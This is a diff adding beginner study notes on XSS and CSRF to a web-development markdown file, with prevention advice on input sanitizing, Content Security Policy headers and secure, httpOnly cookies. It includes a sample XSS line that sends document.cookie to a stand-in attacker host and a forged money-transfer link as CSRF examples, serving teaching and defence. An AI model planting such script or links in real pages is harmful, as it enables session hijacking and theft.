@@ -84,3 +84,47 @@ app.use(morgan('combined')); // or 'tiny'
   * Let's Encrypt(https://letsencrypt.org/): Free
   * Github Pages
   * Cloudfare
+  
+### XSS & CSRF
+
+* XSS: Cross Site Scripting
+  * Whenever an Application includes untrusted data in a new Web page without proper validation or escaping
+  * Updating a Web page with User supplied data using JS
+  * Allows Attacker to execute scripts in a victim's browser
+  * Example of blog post in which attacker uses comments to include js code
+  * Used for **session hijacking**
+```js
+window.location = 'haxxed.com?cookie=' + document.cookie
+// haxxed.com is a bad website
+// Send the cookie from your browser
+```
+  * To prevent this, sanitize the inputs
+* CSRF: Cross Site Request Forgery
+  * Create a bad url that has malicious code in it
+```js
+<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=100">Read more!</a>
+// Click on a link to send money
+// Here get request and query parameters are used, instead we can also use post request and various other things
+```
+* We can set headers in our endpoints to make it secure
+  * For ex, in twitter you can't send document.cookie to other sites due to Security Content Policy
+```js
+app.get('/', (req, res) => {
+  res.cookie('session', '1', { httpOnly: true, })
+  res.cookie('session', '1', { secure: true })
+  res.set({
+    'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"
+  })
+  res.send('Hello World!')
+})
+// Only places js to be run is self: localhost and google apis
+// There are npm packages where this is done automatically
+```
+
+#### To Prevent XSS & CSRF
+
+* Sanitize input
+* No eval()
+* No document.write()
+* Content Security Policy
+* Secure + HTTPOnly Cookies
